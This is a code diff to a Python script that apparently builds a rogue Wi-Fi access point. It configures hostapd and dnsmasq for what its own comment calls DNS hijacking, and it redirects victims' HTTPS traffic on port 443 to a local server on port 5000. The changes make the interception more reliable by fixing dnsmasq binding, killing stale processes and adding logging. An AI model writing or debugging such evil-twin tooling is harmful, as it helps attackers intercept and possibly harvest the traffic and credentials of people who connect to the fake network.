@@ -698,7 +698,8 @@ rsn_pairwise=CCMP
     # 3. 配置dnsmasq (DNS劫持)
     dnsmasq_conf = f"""
 interface={iface}
-bind-interfaces
+bind-dynamic
+listen-address=192.168.4.1
 no-resolv
 dhcp-range=192.168.4.2,192.168.4.100,255.255.255.0,12h
 dhcp-option=3,192.168.4.1
@@ -725,11 +726,13 @@ dhcp-authoritative
     run_cmd(['sudo', 'iptables', '-t', 'nat', '-A', 'PREROUTING', '-i', iface, '-p', 'tcp', '--dport', '443', '-j', 'REDIRECT', '--to-port', '5000'])
 
     # 5. 启动服务
+    run_cmd(['sudo', 'pkill', '-9', 'dnsmasq'])  # 清理残留
     with open('/tmp/hostapd.log', 'w') as hp_log:
         subprocess.Popen(['sudo', 'hostapd', '/tmp/hostapd.conf'],
                         stdout=hp_log, stderr=subprocess.STDOUT)
-    subprocess.Popen(['sudo', 'dnsmasq', '-C', '/tmp/dnsmasq.conf', '-d'], 
-                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    with open('/tmp/dnsmasq.log', 'w') as dm_log:
+        subprocess.Popen(['sudo', 'dnsmasq', '-C', '/tmp/dnsmasq.conf', '-d', '--log-facility=/tmp/dnsmasq.log'],
+                        stdout=dm_log, stderr=subprocess.STDOUT)
     
     import time
     time.sleep(1)
